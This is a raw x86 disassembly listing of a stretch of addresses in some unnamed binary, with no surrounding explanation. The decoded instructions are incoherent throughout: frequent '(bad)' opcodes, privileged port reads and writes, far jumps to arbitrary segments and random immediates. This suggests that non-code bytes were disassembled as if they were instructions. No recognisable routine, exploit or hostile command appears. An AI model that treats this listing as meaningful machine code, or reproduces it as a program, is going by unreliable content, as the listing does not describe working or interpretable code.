  42c7af:	ret    0xc3da
  42c7b2:	in     al,dx
  42c7b3:	rcr    ch,cl
  42c7b5:	(bad)  
  42c7b6:	fadd   st,st(0)
  42c7b8:	loopne 0x42c79f
  42c7ba:	leave  
  42c7bb:	in     eax,dx
  42c7bc:	sti    
  42c7bd:	add    al,0xc0
  42c7bf:	shr    BYTE PTR [ebp+ecx*8-0x3a1d3c4a],cl
  42c7c6:	(bad)
  42c7c9:	lock mov edx,0xdbdeb5ca
  42c7cf:	mov    edi,0xc4e4bfc2
  42c7d4:	sar    BYTE PTR [eax+0xfeaddf0],1
  42c7da:	push   es
  42c7db:	(bad)
  42c7de:	fsubr  st(0),st
  42c7e0:	retf   0xf5e4
  42c7e3:	fsubr  st(5),st
  42c7e5:	in     al,dx
  42c7e6:	int    0xb8
  42c7e8:	in     eax,0xb9
  42c7ea:	(bad)  
  42c7ec:	(bad)  
  42c7ed:	fyl2x  
  42c7ef:	in     eax,dx
  42c7f0:	ret    
  42c7f1:	sar    bl,0xcc
  42c7f4:	aad    0xfe
  42c7f6:	aam    0xfb
  42c7f8:	push   cs
  42c7f9:	or     ebp,esp
  42c7fb:	push   cs
  42c7fc:	fstp   st(5)
  42c7fe:	icebp  
  42c7ff:	loop   0x42c7ea
  42c801:	int3   
  42c802:	fst    st(3)
  42c804:	lods   eax,DWORD PTR ds:[esi]
  42c805:	stc    
  42c806:	cmc    
  42c807:	jmp    0xcf17be02
  42c80c:	call   esp
  42c80e:	rol    edx,1
  42c810:	lock shl dl,0xbd
  42c814:	rcl    eax,1
  42c816:	(bad)  
  42c817:	add    dl,bh
  42c819:	add    al,0xed
  42c81b:	or     DWORD PTR [edi],eax
  42c81d:	clc    
  42c81e:	jmp    0xfbc5:0xbcc1e8d3
  42c825:	leave  
  42c826:	(bad)  
  42c827:	mov    cl,0xde
  42c829:	out    dx,eax
  42c82a:	(bad)  
  42c82c:	loop   0x42c81d
  42c82e:	repnz shl cl,0xf6
  42c832:	sti    
  42c833:	fcomi  st,st(5)
  42c835:	loop   0x42c831
  42c837:	fcmove st,st(1)
  42c839:	jecxz  0x42c80a
  42c83b:	retf   0xc0f8
  42c83e:	int3   
  42c83f:	sar    DWORD PTR [edi-0x5230171e],1
  42c845:	ret    0xc5d5
  42c848:	mov    eax,0xdae8b9f2
  42c84d:	sar    BYTE PTR [ecx-0x1a262224],1
  42c853:	add    dh,bl
  42c855:	cli    
  42c856:	hlt    
  42c857:	pop    es
  42c858:	out    0xc0,al
  42c85a:	(bad)  
  42c85b:	fcom   DWORD PTR [edx]
  42c85d:	retf   
  42c85e:	mov    esp,0xcef2c7d0
  42c864:	(bad)  
  42c865:	int3   
  42c866:	jmp    0xbb14c850
  42c86b:	(bad)  
  42c86d:	mov    ebp,0xece7c803
  42c872:	fild   WORD PTR [esi]
  42c874:	(bad)  
  42c875:	icebp  
  42c876:	add    eax,0xe5e203e6
  42c87b:	loop   0x42c850
  42c87d:	adc    edx,edx
  42c87f:	into   
  42c880:	test   eax,0xc3d1d7b0
  42c885:	retf   
  42c886:	cli    
  42c887:	iret   
  42c888:	retf   
  42c889:	retf   0xf7b3
  42c88c:	add    cl,bh
  42c88e:	mov    edx,0xc5ccdff6
  42c893:	fadd   QWORD PTR [ecx]
  42c895:	sar    bl,0xdc
  42c898:	fdivrp st(6),st
  42c89a:	or     al,0x7
  42c89c:	loopne 0x42c8a3
  42c89e:	call   0xae346e62
  42c8a3:	retf   
  42c8a4:	(bad)
  42c8a7:	sti    
  42c8a8:	mov    eax,0xebfbd8fe
  42c8ad:	loop   0x42c89e
  42c8af:	ret    
  42c8b0:	fcmovnbe st,st(7)
  42c8b2:	in     al,dx
  42c8b3:	(bad)
  42c8b6:	loop   0x42c8b4
  42c8b8:	add    esi,ecx
  42c8ba:	in     al,0xfe
  42c8bc:	repz fcompp 
  42c8bf:	mov    cl,0xcb
  42c8c1:	in     al,dx
  42c8c2:	(bad)
  42c8c5:	call   0xd20e79b0
  42c8ca:	mov    ebp,0xfeede9ea
  42c8cf:	fdivrp st(0),st
  42c8d1:	clc    
  42c8d2:	(bad)
  42c8d5:	pop    es
  42c8d6:	add    ch,al
  42c8d8:	fild   DWORD PTR [esi]
  42c8da:	retf   
  42c8db:	push   cs
  42c8dc:	add    esi,edi
  42c8de:	lods   eax,DWORD PTR ds:[esi]
  42c8df:	in     al,dx
  42c8e0:	jmp    0x42c8ca
  42c8e2:	cmc    
  42c8e3:	div    dh
  42c8e5:	into   
  42c8e6:	fadd   st,st(5)
  42c8e8:	jmp    0xf3f97eeb
  42c8ed:	into   
  42c8ee:	int    0xe8
  42c8f0:	aad    0x5
  42c8f2:	rcl    ah,0xc3
  42c8f5:	add    eax,0xddf5c4c1
  42c8fa:	cli    
  42c8fb:	or     DWORD PTR [ebx],ecx
  42c8fd:	int3   
  42c8fe:	stos   BYTE PTR es:[edi],al
  42c8ff:	repnz mov al,0xb7
  42c903:	scas   al,BYTE PTR es:[edi]
  42c904:	in     al,0xc2
  42c906:	leave  
  42c907:	cmc    
  42c908:	retf   0xe8d4
  42c90b:	repz hlt 
  42c90d:	add    ecx,edx
  42c90f:	fiadd  DWORD PTR [ebx]
  42c911:	out    0xf5,eax
  42c913:	fmul   QWORD PTR [ebx]
  42c915:	jmp    0x42c8e8
  42c917:	out    0xef,eax
  42c919:	(bad)  
  42c91a:	in     al,0xea
  42c91c:	call   0xcf04712e
  42c921:	div    ch
  42c923:	loop   0x42c90d
  42c925:	repz hlt 
  42c927:	mul    dh
  42c929:	out    dx,eax
  42c92a:	rcl    esp,1
  42c92c:	cli    
  42c92d:	cld    
  42c92e:	mov    esi,0x6dbe0d8
  42c933:	cli    
  42c934:	(bad)  
  42c936:	jecxz  0x42c90d
  42c938:	stc    
  42c939:	jecxz  0x42c904
  42c93b:	or     al,0xe4
  42c93d:	loope  0x42c908
  42c93f:	fucom  st(4)
  42c941:	loop   0x42c91a
  42c943:	out    0xa9,al
  42c945:	out    0xd3,al
  42c947:	(bad)  
  42c949:	in     eax,dx
  42c94a:	repnz xlat BYTE PTR ds:[ebx]
  42c94c:	xlat   BYTE PTR ds:[ebx]
  42c94d:	fmul   st,st(4)
  42c94f:	std    
  42c950:	fadd   QWORD PTR [esi]
  42c952:	aam    0xfb
  42c954:	shl    dh,0xc4
  42c957:	cld    
  42c958:	aam    0xfb
  42c95a:	std    
  42c95b:	in     al,0xdb
  42c95d:	shl    al,0xb2
  42c960:	(bad)  
  42c961:	int    0xab
  42c963:	ret    
  42c964:	jmp    0xd530833e
  42c969:	ffreep st(4)
  42c96b:	jmp    0xd9bd:0xd5fddfff
  42c972:	fsubrp st(2),st
  42c974:	sar    esi,0xb
  42c977:	test   dl,0xf
  42c97a:	(bad)  
  42c97b:	jmp    0x42c93e
  42c97d:	in     eax,0xe2
  42c97f:	retf   
  42c980:	mov    bh,0xac
  42c982:	loop   0x42c955
  42c984:	retf   0xe1ec
  42c987:	aam    0xdf
  42c989:	(bad)  
  42c98a:	mov    ch,0xd1
  42c98c:	fldl2t 
  42c98e:	fidivr DWORD PTR [edx-0x53c084b]
  42c994:	stc    
  42c995:	(bad)  
  42c997:	(bad)  
  42c999:	or     BYTE PTR [ecx],cl
  42c99b:	(bad)
  42c99e:	jmp    0x42c96d
  42c9a0:	shl    dl,1
  42c9a2:	in     al,dx
  42c9a3:	in     al,0xec
  42c9a5:	xlat   BYTE PTR ds:[ebx]
  42c9a6:	call   0xb4088073
  42c9ab:	(bad)  
  42c9ac:	mul    bl
  42c9ae:	(bad)  
  42c9af:	int    0xff
  42c9b1:	sar    edx,cl
  42c9b3:	fchs   
  42c9b5:	mov    eax,0xd9f9c6c3
  42c9ba:	jmp    0xcc49b1c9
  42c9bf:	mov    bl,0xef
  42c9c1:	iret   
  42c9c2:	out    dx,al
  42c9c3:	loopne 0x42c992
  42c9c5:	in     eax,0xef
  42c9c7:	mov    dl,0xc7
  42c9c9:	ror    dl,1
  42c9cb:	mov    edi,0xf9edec02
  42c9d0:	in     al,dx
  42c9d1:	cmc    
  42c9d2:	add    dh,dl
  42c9d4:	jmp    0x42c9bc
  42c9d6:	les    eax,FWORD PTR [edx*8+0x705c4d4]
  42c9dd:	(bad)  
  42c9df:	shl    DWORD PTR [eax-0x31363249],1
  42c9e5:	enter  0xaee4,0xd6
  42c9e9:	repz neg cl
  42c9ec:	out    dx,al
  42c9ed:	fdiv   st,st(4)
  42c9ef:	add    cl,dl
  42c9f1:	sar    DWORD PTR [edi-0x3b1bfaf9],cl
  42c9f7:	enter  0xdaf6,0xe9
  42c9fb:	jecxz  0x42c9d7
  42c9fd:	cli    
  42c9fe:	int3   
  42c9ff:	jecxz  0x42c9f0
  42ca01:	loope  0x42c9f6
  42ca03:	mov    ch,0xe4
  42ca05:	jmp    0xcbf8:0xc4bfdbe0
  42ca0c:	repz div edi
  42ca0f:	(bad)  
  42ca11:	rcl    dl,0xd0
  42ca14:	sar    esp,0xf1
  42ca17:	push   es
  42ca18:	call   0xcd0bc911
  42ca1d:	enter  0xe2a9,0xd3
  42ca21:	test   al,0xcf
  42ca23:	int    0xc2
  42ca25:	(bad)  
  42ca27:	shl    BYTE PTR [esi+ebx*8-0x35070912],cl
  42ca2e:	(bad)  
  42ca2f:	out    0xff,eax
  42ca31:	repnz repnz shl dh,0xe3
  42ca36:	jecxz  0x42ca03
  42ca38:	enter  0xcb06,0xec
  42ca3c:	psllq  mm2,mm2
  42ca3f:	in     al,0xec
  42ca41:	jmp    0x42c9ff
  42ca43:	enter  0xf2c7,0xb0
  42ca47:	(bad)  
  42ca48:	into   
  42ca49:	stc    
  42ca4a:	repz jmp 0xcdbd:0xf4f8d8f9
  42ca52:	sar    eax,cl
  42ca54:	add    al,0xeb
  42ca56:	ret    0xdcc8
  42ca59:	or     bh,dh
  42ca5b:	or     edi,edi
  42ca5d:	call   ebx
  42ca5f:	jmp    0xe319ac54
  42ca64:	mov    bl,0xb1
  42ca66:	test   ebp,0xbddff3b5
  42ca6c:	fyl2x  
  42ca6e:	out    dx,eax
  42ca6f:	aam    0xc7
  42ca71:	sar    bh,1
  42ca73:	pop    es
  42ca74:	(bad)  
  42ca75:	(bad)  
  42ca77:	leave  
  42ca78:	iret   
  42ca79:	cld    
  42ca7a:	fsubr  st(4),st
  42ca7c:	ftst   
  42ca7e:	(bad)  
  42ca7f:	scas   al,BYTE PTR es:[edi]
  42ca80:	in     al,dx
  42ca81:	div    DWORD PTR [esi-0x1e361c20]
  42ca87:	mov    al,0xec
  42ca89:	(bad)  
  42ca8a:	mov    ch,0xeb
  42ca8c:	fsubr  st,st(7)
  42ca8e:	rol    edx,cl
  42ca90:	cld    
  42ca91:	shl    dh,0xd9
  42ca94:	sti    
  42ca95:	(bad)  
  42ca97:	add    edi,edx
  42ca99:	lds    ecx,FWORD PTR [edx+edi*8]
  42ca9c:	dec    BYTE PTR [esi]
  42ca9e:	(bad)  
  42ca9f:	iret   
  42caa0:	shl    cl,0xb0
  42caa3:	(bad)  
  42caa5:	lods   al,BYTE PTR ds:[esi]
  42caa6:	mov    bh,0xf6
  42caa8:	in     eax,0xfb
  42caaa:	fmul   st(3),st
  42caac:	idiv   dh
  42caae:	call   0x21b838a
  42cab3:	aad    0xd8
  42cab5:	aad    0x4
  42cab7:	or     ebp,edx
  42cab9:	hlt    
  42caba:	aad    0xed
  42cabc:	fimul  DWORD PTR [eax]
  42cabe:	int3   
  42cabf:	fadd   st(2),st
  42cac1:	(bad)  
  42cac3:	imul   al
  42cac5:	fcomi  st,st(3)
  42cac7:	repnz into 
  42cac9:	in     eax,0xb3
  42cacb:	retf   0xbef5
  42cace:	in     eax,dx
  42cacf:	xlat   BYTE PTR ds:[ebx]
  42cad0:	rcr    esp,cl
  42cad2:	in     al,0xe3
  42cad4:	out    0xd0,al
  42cad6:	fucomi st,st(3)
  42cad8:	aam    0xfb
  42cada:	add    bl,bh
  42cadc:	add    cl,cl
  42cade:	icebp  
  42cadf:	icebp  
  42cae0:	into   
  42cae1:	cmc    
  42cae2:	div    dh
  42cae4:	loopne 0x42cace
  42cae6:	in     eax,dx
  42cae7:	lds    esi,FWORD PTR [ebp+eiz*8-0x1d442716]
  42caee:	sti    
  42caef:	mov    dh,0xd9
  42caf1:	in     al,dx
  42caf2:	add    dh,dl
  42caf4:	call   eax
  42caf6:	(bad)  
  42caf7:	inc    ebp
  42caf9:	loopne 0x42cb04
  42cafb:	int    0xdf
  42cafd:	loopne 0x42cabb
  42caff:	(bad)  
  42cb00:	ror    ah,cl
  42cb02:	int3   
  42cb03:	mov    ch,0xc0
  42cb05:	(bad)  
  42cb07:	ror    ch,cl
  42cb09:	jmp    0x42cac1
  42cb0b:	fcom   st(1)
  42cb0d:	iret   
  42cb0e:	(bad)  
  42cb10:	out    0xc6,eax
  42cb12:	repnz dec bl
  42cb15:	neg    bl
  42cb17:	cld    
  42cb18:	jecxz  0x42cb05
  42cb1a:	iret   
  42cb1b:	add    al,0xf
  42cb1d:	or     eax,0xa8e9c5cf
  42cb22:	in     al,dx
  42cb23:	retf   0xf3ad
  42cb26:	out    0xe5,al
  42cb28:	out    0xd6,al
  42cb2a:	shr    dl,cl
  42cb2c:	mov    cl,0xbb
  42cb2e:	sar    DWORD PTR [edx-0x3e423e41],1
  42cb34:	icebp  
  42cb35:	mov    esp,0x6020bff
  42cb3a:	hlt    
  42cb3b:	fucomp st(5)
  42cb3d:	or     edi,DWORD PTR [edi-0x2b1b413e]
  42cb43:	lock mov cl,0xf5
  42cb46:	retf   0xb0d8
  42cb49:	cli    
  42cb4a:	test   ah,0xf6
  42cb4d:	jmp    0xf2f8ab41
  42cb52:	mov    ebp,0xc6f90ad7
  42cb57:	add    cl,BYTE PTR [ecx]
  42cb59:	jmp    0xc9e2:0xd3e4dae5
  42cb60:	out    dx,al
  42cb61:	lods   eax,DWORD PTR ds:[esi]
  42cb62:	(bad)  
  42cb64:	repz icebp 
  42cb66:	jmp    0x42cb53
  42cb68:	in     eax,dx
  42cb69:	int    0xce
  42cb6b:	fstp   st(4)
  42cb6d:	ror    esi,cl
  42cb6f:	(bad)  
  42cb70:	fsubrp st(5),st
  42cb72:	repnz fstp st(0)
  42cb75:	add    bl,ch
  42cb77:	sti    
  42cb78:	pop    es
  42cb79:	aad    0xee
  42cb7b:	in     eax,dx
  42cb7c:	call   0xe42aa966
  42cb81:	mov    dh,0xef
  42cb83:	aam    0xc5
  42cb85:	(bad)  
  42cb86:	call   0xe93d9d85
  42cb8b:	jmp    0x42cb63
  42cb8d:	mul    cl
  42cb8f:	(bad)  
  42cb90:	(bad)  
  42cb91:	xlat   BYTE PTR ds:[ebx]
  42cb92:	clc    
  42cb93:	pop    es
  42cb94:	clc    
  42cb95:	out    0xf7,al
  42cb97:	retf   
  42cb98:	pop    es
  42cb99:	add    eax,ebx
  42cb9b:	jmp    esi
  42cb9d:	add    eax,0xb0aef0c8
  42cba2:	out    dx,al
  42cba3:	call   0xb4f8865c
  42cba8:	mov    eax,0xd5eddfbb
  42cbad:	(bad)  
  42cbae:	fcmovne st,st(5)
  42cbb0:	fsub   st(5),st
  42cbb2:	int3   
  42cbb3:	repz ret 0xc1e5
  42cbb7:	psadbw mm7,mm7
  42cbba:	loop   0x42cbca
  42cbbc:	or     edi,edi
  42cbbe:	out    dx,al
  42cbbf:	int    0xf6
  42cbc1:	in     eax,0xe0
  42cbc3:	fadd   st(4),st
  42cbc5:	mov    dh,0xe9
  42cbc7:	int    0xba
  42cbc9:	shl    bh,1
  42cbcb:	jmp    0x42cba3
  42cbcd:	repz jecxz 0x42cb91
  42cbd0:	lock lock int3 
  42cbd3:	or     esi,esp
  42cbd5:	rcr    ch,0xc6
  42cbd8:	iret   
  42cbd9:	add    eax,0xd80c04fe
  42cbde:	shr    BYTE PTR [esi-0x34231412],0xc4
  42cbe5:	mov    al,0xf2
  42cbe7:	test   bh,0xdb
  42cbea:	into   
  42cbeb:	shr    al,1
  42cbed:	(bad)  
  42cbee:	mov    ebp,0xf8d3e3de
  42cbf3:	icebp  
  42cbf4:	add    al,ch
  42cbf6:	(bad)  
  42cbf8:	neg    edi
  42cbfa:	leave  
  42cbfb:	jmp    0x42cbc1
  42cbfd:	in     al,dx
  42cbfe:	lock out dx,eax
  42cc00:	rol    edx,1
  42cc02:	out    0xac,eax
  42cc04:	cli    
  42cc05:	iret   
  42cc06:	iret   
  42cc07:	in     eax,0xe4
  42cc09:	jmp    0xedfba4d2
  42cc0e:	mov    ecx,0xfa00d9bc
  42cc13:	xlat   BYTE PTR ds:[ebx]
  42cc14:	fdivr  st,st(0)
  42cc16:	fsubrp st(4),st
  42cc18:	std    
  42cc19:	into   
  42cc1a:	add    ebp,ebx
  42cc1c:	rcr    edi,0xe6
  42cc1f:	rcr    ch,cl
  42cc21:	in     eax,dx
  42cc22:	out    0xcb,al
  42cc24:	into   
  42cc25:	int3   
  42cc26:	fxch   st(3)
  42cc28:	retf   
  42cc29:	(bad)
  42cc2c:	std    
  42cc2d:	add    bh,BYTE PTR [edx-0x1224100c]
  42cc33:	fiadd  WORD PTR [ebx]
  42cc35:	jmp    0x2e3:0xc507ebf7
  42cc3c:	cld    
  42cc3d:	std    
  42cc3e:	rcr    esp,cl
  42cc40:	mov    ebp,0xd6e7b6c3
  42cc45:	jmp    0xbcf8:0xe4ecc6e7
  42cc4c:	shr    ecx,cl
  42cc4e:	leave  
  42cc4f:	mov    eax,0xfdc1ded8
  42cc54:	test   BYTE PTR [edi],0xf1
  42cc57:	mov    esi,0xdefce0e0
  42cc5c:	int    0xe4
  42cc5e:	out    0xc0,al
  42cc60:	(bad)  
  42cc61:	call   0xea05bb11
  42cc66:	loopne 0x42cc63
  42cc68:	retf   
  42cc69:	mov    ecx,0xbaf9ffce
  42cc6e:	cmc    
  42cc6f:	aad    0xee
  42cc71:	(bad)  
  42cc73:	xlat   BYTE PTR ds:[ebx]
  42cc74:	icebp  
  42cc75:	hlt    
  42cc76:	(bad)  
  42cc77:	out    dx,eax
  42cc78:	retf   
  42cc79:	cmc    
  42cc7a:	leave  
  42cc7b:	in     al,0xa
  42cc7d:	int    0xc9
  42cc7f:	out    dx,eax
  42cc80:	shr    DWORD PTR [eax-0x19355515],1
  42cc86:	stc    
  42cc87:	in     eax,dx
  42cc88:	rcl    ch,1
  42cc8a:	(bad)  
  42cc8c:	into   
  42cc8d:	sar    DWORD PTR [eax-0x28281f18],cl
  42cc93:	add    ecx,DWORD PTR [ebx]
  42cc95:	loop   0x42cc92
  42cc97:	std    
  42cc98:	add    al,0xd
  42cc9a:	iret   
  42cc9b:	add    eax,0xb1c703fb
  42cca0:	in     al,0xbe
  42cca2:	into   
  42cca3:	rcl    eax,0xb7
  42cca6:	aad    0xd2
  42cca8:	leave  
  42cca9:	mov    edx,0xdfc8c4b5
  42ccae:	jmp    eax
  42ccb0:	ret    0xfdc2
  42ccb3:	mov    esp,0xfffc04e2
  42ccb8:	clc    
  42ccb9:	jmp    0xc5ad:0xe506e4c4
  42ccc0:	jecxz  0x42cc94
  42ccc2:	mov    bl,0xb5
  42ccc4:	ror    bl,cl
  42ccc6:	into   
  42ccc7:	jmp    0xe414cbc1
  42cccc:	call   0xdf24c18c
  42ccd1:	(bad)  
  42ccd2:	mov    ebx,0xe0dce0f6
  42ccd7:	retf   0xfde
  42ccda:	loop   0x42cca5
  42ccdc:	(bad)  
  42ccde:	leave  
  42ccdf:	out    0xe5,eax
  42cce1:	icebp  
  42cce2:	lock ret 
  42cce4:	sar    DWORD PTR [edx-0x17522b13],0xbb
  42cceb:	aad    0xc3
  42cced:	leave  
  42ccee:	clc    
  42ccef:	mov    dh,0xf5
  42ccf1:	in     eax,dx
  42ccf2:	fild   WORD PTR [esi+eax*8]
  42ccf5:	ret    
  42ccf6:	ret    
  42ccf7:	clc    
  42ccf8:	fmul   st(2),st
  42ccfa:	fcmovnu st,st(6)
  42ccfc:	adc    esp,ebx
  42ccfe:	loope  0x42ccde
  42cd00:	loope  0x42ccae
  42cd02:	loope  0x42ccce
  42cd04:	int3   
  42cd05:	in     eax,dx
  42cd06:	imul   DWORD PTR [esi-0x142b3a3c]
  42cd0c:	fcmovnbe st,st(4)
  42cd0e:	hlt    
  42cd0f:	fsub   st(7),st
  42cd11:	ret    
  42cd12:	aam    0x2
  42cd14:	stc    
  42cd15:	fcmovnb st,st(4)
  42cd17:	add    al,0xeb
  42cd19:	(bad)  
  42cd1b:	clc    
  42cd1c:	clc    
  42cd1d:	retf   
  42cd1e:	shr    DWORD PTR [ecx-0x2954162d],1
  42cd24:	(bad)  
  42cd25:	fucomi st,st(7)
  42cd27:	jmp    0x42cce1
  42cd29:	fxch   st(3)
  42cd2b:	aam    0xd6
  42cd2d:	fucomip st,st(5)
  42cd2f:	(bad)  
  42cd31:	test   bh,0xd3
  42cd34:	repz hlt 
  42cd36:	aam    0xfd
  42cd38:	pop    es
  42cd39:	(bad)  
  42cd3a:	loopne 0x42cd1e
  42cd3c:	or     eax,0xcbc9bde6
  42cd41:	test   al,0xce
  42cd43:	out    0xfa,al
  42cd45:	jmp    0xf8ff:0xb6f8dfd3
  42cd4c:	(bad)  
  42cd4e:	in     al,dx
  42cd4f:	mov    eax,0xccc7ddf1
  42cd54:	mov    esp,0xe70a06e9
  42cd59:	jmp    0xaad1:0xfe6cfc5
  42cd60:	(bad)  
  42cd61:	lock in al,dx
  42cd63:	ret    
  42cd64:	fcmovb st,st(0)
  42cd66:	int    0xb4
  42cd68:	fmul   st,st(2)
  42cd6a:	std    
  42cd6b:	div    esi
  42cd6d:	std    
  42cd6e:	icebp  
  42cd6f:	mov    ebp,0xe2f9c2dc
  42cd74:	out    0xe2,al
  42cd76:	push   eax
  42cd78:	imul   bh
  42cd7a:	paddw  mm4,mm6
  42cd7d:	add    BYTE PTR [esi-0x3d494f44],ch
  42cd83:	stos   BYTE PTR es:[edi],al
  42cd84:	mov    cl,0xc5
  42cd86:	jmp    0xd336cc78
  42cd8b:	shl    edx,cl
  42cd8d:	fiadd  WORD PTR [eax]
  42cd8f:	lock aam 0xbc
  42cd92:	add    esp,edx
  42cd94:	fcomip st,st(2)
  42cd96:	ror    dl,0xf7
  42cd99:	sti    
  42cd9a:	(bad)  
  42cd9b:	clc    
  42cd9c:	psubsb mm7,QWORD PTR [edi-0x1f3c132e]
  42cda3:	rol    edx,0xda
  42cda6:	(bad)  
  42cda7:	(bad)  
  42cda8:	(bad)  
  42cda9:	std    
  42cdaa:	fsub   st(5),st
  42cdac:	fcomp  st(4)
  42cdae:	add    bh,dl
  42cdb0:	fdivr  DWORD PTR [eax+edx*8+0x8ebd7d1]
  42cdb7:	stc    
  42cdb8:	sti    
  42cdb9:	loope  0x42cdaa
  42cdbb:	(bad)  
  42cdbd:	std    
  42cdbe:	scas   eax,DWORD PTR es:[edi]
  42cdbf:	loopne 0x42cd8d
  42cdc1:	(bad)  
  42cdc2:	loopne 0x42cdaa
  42cdc4:	jmp    0xb12ba88a
  42cdc9:	aad    0xd4
  42cdcb:	cld    
  42cdcc:	mov    ah,0xf8
  42cdce:	ret    
  42cdcf:	enter  0x1fa,0xf2
  42cdd3:	loop   0x42cd9b
  42cdd5:	stc    
  42cdd6:	(bad)  
  42cdd8:	fmul   st(6),st
  42cdda:	add    eax,0xd1c8c8fd
  42cddf:	repz scas eax,DWORD PTR es:[edi]
  42cde1:	shl    BYTE PTR [edi-0x94d253c],1
  42cde7:	test   dh,0xb5
  42cdea:	retf   0xd0d8
  42cded:	shl    bl,1
  42cdef:	rol    eax,1
  42cdf1:	cld    
  42cdf2:	out    0xf8,eax
  42cdf4:	shl    esi,1
  42cdf6:	rcr    dh,0x7
  42cdf9:	(bad)  
  42cdfb:	cli    
  42cdfc:	iret   
  42cdfd:	adc    edx,edx
  42cdff:	retf   0xeeb3
  42ce02:	mov    ch,0xdb
  42ce04:	out    dx,eax
  42ce05:	ror    bl,0xce
  42ce08:	mov    ecx,0xfdfcb3ba
  42ce0d:	repnz clc 
  42ce0f:	ret    
  42ce10:	add    dh,ch
  42ce12:	lock mov esp,0xe3f8defc
  42ce18:	fadd   st,st(7)
  42ce1a:	(bad)  
  42ce1b:	fsubrp st(0),st
  42ce1d:	icebp  
  42ce1e:	mov    ecx,0xecedebc8
  42ce23:	lock out 0xfa,eax
  42ce26:	aad    0xc0
  42ce28:	int    0xce
  42ce2a:	(bad)  
  42ce2b:	shl    ebx,1
  42ce2d:	lock mov edx,0xbfecdffb
  42ce33:	mov    esi,0xf8dbd2
  42ce38:	loop   0x42cdff
  42ce3a:	aam    0x5
  42ce3c:	loop   0x42ce29
  42ce3e:	(bad)  
  42ce3f:	mov    bl,0xac
  42ce41:	(bad)  
  42ce42:	shr    BYTE PTR [esi+esi*4-0x2d344d0b],0xee
  42ce4a:	retf   0xfed9
  42ce4d:	cmc    
  42ce4e:	fcom   st(6)
  42ce50:	(bad)  
  42ce51:	repz repz add eax,0xfe2f6c6
  42ce58:	cmc    
  42ce59:	or     esp,edi
  42ce5b:	fcmove st,st(0)
  42ce5d:	in     al,dx
  42ce5e:	shl    al,1
  42ce60:	icebp  
  42ce61:	enter  0xe3ea,0xef
  42ce65:	shl    ebp,0xb5
  42ce68:	mov    edx,0xf8ecd5c8
  42ce6d:	fcmovnu st,st(2)
  42ce6f:	aam    0xd7
  42ce71:	clc    
  42ce72:	loope  0x42ce52
  42ce74:	mov    ecx,0xfed6c5eb
  42ce79:	jmp    0xbfab:0xcdfecd4
  42ce80:	mov    esp,0xefc2cbd7
  42ce85:	hlt    
  42ce86:	mov    dl,0xd4
  42ce88:	(bad)  
  42ce89:	repnz (bad) 
  42ce8b:	fsubr  st,st(3)
  42ce8d:	out    dx,eax
  42ce8e:	fsubr  st(7),st
  42ce90:	fdiv   st(6),st
  42ce92:	fcmovnbe st,st(5)
  42ce94:	loope  0x42ce88
  42ce96:	std    
  42ce97:	ror    BYTE PTR [ecx],1
  42ce99:	or     bl,al
  42ce9b:	iret   
  42ce9c:	out    dx,al
  42ce9d:	loope  0x42ce6f
  42ce9f:	int3   
  42cea0:	mov    dl,0xe8
  42cea2:	aad    0xd1
  42cea4:	rcl    ch,0xc5
  42cea7:	fucomi st,st(5)
  42cea9:	mov    al,0xce
  42ceab:	mov    esi,0xb9bdf9f3
  42ceb0:	add    DWORD PTR [edi+0xaf6f7de],edi
  42ceb6:	fcmovbe st,st(5)
  42ceb8:	retf   
  42ceb9:	hlt    
  42ceba:	leave  
  42cebb:	or     esp,ebx
  42cebd:	cld    
  42cebe:	in     al,0xec
  42cec0:	mov    al,0xdc
  42cec2:	out    0xe2,eax
  42cec4:	imul   ch
  42cec6:	mov    ecx,0xccfff8b1
  42cecb:	jmp    0x42cea8
  42cecd:	dec    al
  42cecf:	push   DWORD PTR [ebp-0xf0212]
  42ced5:	sar    ch,0xd8
  42ced8:	or     esi,esp
  42ceda:	in     eax,dx
  42cedb:	fyl2xp1 
  42cedd:	rol    edi,cl
  42cedf:	mov    al,0xd6
  42cee1:	iret   
  42cee2:	mul    edi
  42cee4:	hlt    
  42cee5:	aad    0xe4
  42cee7:	ror    edi,1
  42cee9:	fnstcw WORD PTR [ebx-0xa27060f]
  42ceef:	fstp   TBYTE PTR [ebp-0x43f401d]
  42cef5:	fnstsw ax
  42cef7:	fld    DWORD PTR ds:0xf302fac9
  42cefd:	fmul   st(6),st
  42ceff:	in     eax,0xee
  42cf01:	int    0xd1
  42cf03:	in     eax,dx
  42cf04:	shl    dl,1
  42cf06:	mov    ebx,0xc4b9f3ba
  42cf0b:	mov    ebx,0xddcfd6fd
  42cf10:	hlt    
  42cf11:	fiadd  WORD PTR [esi]
  42cf13:	clc    
  42cf14:	in     al,0xd4
  42cf16:	mov    DWORD PTR ds:0xe40aff03,0xd2d0e5ec
  42cf20:	test   eax,0xccd6f4c5
  42cf25:	in     al,0xb3
  42cf27:	mov    dh,0xe6
  42cf29:	into   
  42cf2a:	retf   0xb1fa
  42cf2d:	repz ret 0xe1de
  42cf31:	loopne 0x42cf0e
  42cf33:	(bad)  
  42cf34:	mov    esp,0x3d8d5d6
  42cf39:	jmp    0xc5f0:0xefdefad9
  42cf40:	retf   
  42cf41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf42:	into   
  42cf43:	repnz mul esi
  42cf46:	mov    edx,0xefc8efc5
  42cf4b:	idiv   esp
  42cf4d:	repz mov esp,0xfebccef1
  42cf53:	ret    
  42cf54:	or     esp,esp
  42cf56:	ret    
  42cf57:	out    dx,eax
  42cf58:	aam    0xd
  42cf5a:	into   
  42cf5b:	add    al,0xe7
  42cf5d:	or     al,0xb8
  42cf5f:	enter  0xf1ae,0xc3
  42cf63:	stos   BYTE PTR es:[edi],al
  42cf64:	(bad)  
  42cf65:	mov    al,0xd2
  42cf67:	repnz idiv ch
  42cf6a:	enter  0xfacb,0xe2
  42cf6e:	fcomp  st(1)
  42cf70:	pop    es
  42cf71:	int3   
  42cf72:	sar    dl,cl
  42cf74:	add    al,0xc0
  42cf76:	add    esp,ebp
  42cf78:	cli    
  42cf79:	add    BYTE PTR [edx],al
  42cf7b:	fsubr  st,st(0)
  42cf7d:	cld    
  42cf7e:	int    0xcb
  42cf80:	icebp  
  42cf81:	out    dx,al
  42cf82:	leave  
  42cf83:	ret    
  42cf84:	mov    bl,0xb0
  42cf86:	out    dx,eax
  42cf87:	(bad)  
  42cf88:	icebp  
  42cf89:	aam    0xf0
  42cf8b:	hlt    
  42cf8c:	fsubr  st(2),st
  42cf8e:	(bad)  
  42cf90:	fadd   st(6),st
  42cf92:	add    al,0x7
  42cf94:	ffree  st(1)
  42cf96:	add    al,0xe2
  42cf98:	mov    BYTE PTR [edi],0xde
